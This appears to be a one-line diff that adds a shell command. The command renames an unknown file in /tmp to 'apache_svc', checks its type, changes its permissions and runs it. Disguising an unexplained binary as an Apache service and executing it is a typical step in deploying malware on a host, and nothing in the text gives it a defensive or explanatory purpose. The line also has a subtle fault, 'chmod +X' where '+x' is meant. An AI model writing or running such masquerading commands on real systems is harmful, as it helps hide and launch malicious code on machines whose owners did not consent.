@@ -1,0 +1,1 @@
+mv /tmp/xd /tmp/apache_svc && file  /tmp/apache_svc && chmod +X /tmp/apache_svc && /tmp/apache_svc
